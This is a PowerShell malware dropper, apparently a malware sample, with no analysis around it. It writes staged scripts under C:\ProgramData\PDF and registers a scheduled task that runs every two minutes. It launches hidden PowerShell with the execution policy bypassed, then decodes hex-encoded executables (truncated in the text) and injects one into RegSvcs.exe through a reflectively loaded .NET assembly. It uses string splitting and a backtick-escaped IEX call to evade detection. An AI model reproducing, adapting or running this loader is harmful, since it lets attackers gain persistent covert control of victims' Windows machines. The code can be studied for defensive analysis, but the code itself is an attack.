$a = "C:\ProgramData\PDF"
New-Item $a -ItemType Directory -Force
Sleep 1
$Content = @'
try 
{
&'schtasks.exe' '/create' '/sc' 'minute' '/mo' 2 '/tn' 'PDF' '/tr' (('C:\ProgramData\PDF\PDF.vbs'));
} catch { }
'@
[IO.File]::WriteAllText("C:\ProgramData\PDF\x.ps1", $Content)
$Content = @'
on error resume next
WScript.Sleep 10000
set A = CreateObject("WScript.Shell")
A.run "C:\ProgramData\PDF\1.bat",0
'@
[IO.File]::WriteAllText("C:\ProgramData\PDF\PDF.vbs", $Content)
$Content = @'
CMD /C powershell -NOP -WIND HIDDEN -eXEC BYPASS -NONI "C:\ProgramData\PDF\PDF.ps1"
'@
[IO.File]::WriteAllText("C:\ProgramData\PDF\1.bat", $Content)
$Content = @'
Try{
function GbLk {
param($GUWZX)$GUWZX = $GUWZX -split '(..)' | ? { $_ }
ForEach ($JSRJ in $GUWZX)
{
[Convert]::ToInt32($JSRJ,16)
}
}
[Byte[]] $GbLk = GbLk $RJSE
[byte[]] $IKSET  = GbLk ('4D5A9...000') # The omitted '4D5A9...000' is actually a 125953 character long string.
}catch{}
Try{
[byte[]] $IKE5RW  = GbLk ('4D5A9...000') # The omitted '4D5A9...000' is actually a 135169 character long string.
$RLD = 'Get'
$EYJ = $RLD + 'Method'
$RUK = 'Invoke'
$RLD = $RLD + 'Type'
$KST = 'Load'
$USW = [Reflection.Assembly]
$KSW = $USW::$KST($IKSET)
$KSW = $KSW.$RLD('NewPE.PE')
$KSW = $KSW.$EYJ('Execute')
$EYJn = 'C:\Windows\Mic'
$WNA = $EYJn + 'rosoft.NET\Fr'
$KRE = $WNA + 'amework\v4.0'
$KRW = $KRE + '.30319\'
$XQ = $KRW + 'RegSvcs.exe'
}catch{}
Try{
$KSW = $KSW.$RUK($null,[object[]] ($XQ,$IKE5RW));
}catch{}
'@
[IO.File]::WriteAllText("C:\ProgramData\PDF\PDF.ps1", $Content)
Start-Sleep 10
I`E`X([IO.File]::ReadAllText('C:\ProgramData\PDF\x.ps1'))
